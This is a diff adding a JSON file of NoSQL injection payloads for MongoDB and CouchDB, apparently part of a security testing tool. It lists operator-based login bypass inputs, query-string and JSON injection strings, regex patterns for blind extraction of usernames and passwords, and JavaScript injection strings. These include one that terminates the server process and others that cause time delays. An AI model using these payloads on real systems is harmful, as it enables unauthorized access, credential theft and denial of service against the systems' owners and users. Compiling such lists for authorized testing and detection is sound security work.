@@ -1,0 +1,105 @@
+{
+  "description": "NoSQL Injection Payloads for MongoDB, CouchDB, and other NoSQL databases",
+  
+  "mongodb_operators": {
+    "comparison": [
+      {"$eq": "admin"},
+      {"$ne": null},
+      {"$ne": ""},
+      {"$gt": ""},
+      {"$gte": ""},
+      {"$lt": "~"},
+      {"$lte": "~"},
+      {"$in": ["admin", "root", "administrator"]},
+      {"$nin": ["invalid"]}
+    ],
+    "logical": [
+      {"$or": [{"username": "admin"}, {"username": "root"}]},
+      {"$and": [{"$gt": ""}, {"$ne": null}]},
+      {"$not": {"$eq": "invalid"}},
+      {"$nor": [{"username": "invalid"}]}
+    ],
+    "element": [
+      {"$exists": true},
+      {"$type": "string"}
+    ],
+    "evaluation": [
+      {"$regex": ".*"},
+      {"$regex": "^a"},
+      {"$regex": "admin.*"},
+      {"$regex": ".*", "$options": "i"},
+      {"$where": "1==1"},
+      {"$where": "this.username == 'admin'"},
+      {"$where": "function(){return true}"},
+      {"$where": "function(){return this.password.length > 0}"}
+    ]
+  },
+  
+  "query_string_payloads": [
+    "[$ne]=1",
+    "[$gt]=",
+    "[$gte]=",
+    "[$lt]=~",
+    "[$regex]=.*",
+    "[$regex]=^a",
+    "[$exists]=true",
+    "[$or][0][username]=admin",
+    "[$or][1][username]=root",
+    "[$where]=1==1",
+    "username[$ne]=invalid&password[$ne]=invalid",
+    "username=admin&password[$gt]=",
+    "username=admin&password[$regex]=.*"
+  ],
+  
+  "json_injection": [
+    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+    "{\"username\": {\"$in\": [\"admin\", \"root\"]}, \"password\": {\"$gt\": \"\"}}",
+    "{\"$where\": \"this.username == 'admin'\"}",
+    "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}"
+  ],
+  
+  "auth_bypass": [
+    {"username": {"$gt": ""}, "password": {"$gt": ""}},
+    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
+    {"username": "admin", "password": {"$gt": ""}},
+    {"username": "admin", "password": {"$ne": ""}},
+    {"username": "admin", "password": {"$regex": ".*"}},
+    {"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$gt": ""}}
+  ],
+  
+  "data_extraction": [
+    {"username": {"$regex": "^a"}},
+    {"username": {"$regex": "^ad"}},
+    {"username": {"$regex": "^adm"}},
+    {"password": {"$regex": "^.{1}"}},
+    {"password": {"$regex": "^.{5}"}},
+    {"password": {"$regex": "^.{10}"}}
+  ],
+  
+  "couchdb_payloads": [
+    {"selector": {"_id": {"$gt": null}}},
+    {"selector": {"password": {"$gt": null}}},
+    {"selector": {"$or": [{"role": "admin"}, {"role": "root"}]}}
+  ],
+  
+  "javascript_injection": [
+    "';return true;var dummy='",
+    "';return this.password;var dummy='",
+    "function(){return true}",
+    "function(){return Object.keys(this)}",
+    "this.constructor.constructor('return process')().exit()"
+  ],
+  
+  "blind_nosql": {
+    "boolean_based": [
+      {"password": {"$regex": "^a"}},
+      {"password": {"$regex": "^b"}},
+      {"password": {"$regex": "^c"}}
+    ],
+    "time_based": [
+      {"$where": "sleep(5000)"},
+      {"$where": "function(){sleep(5000);return true}"}
+    ]
+  }
+}
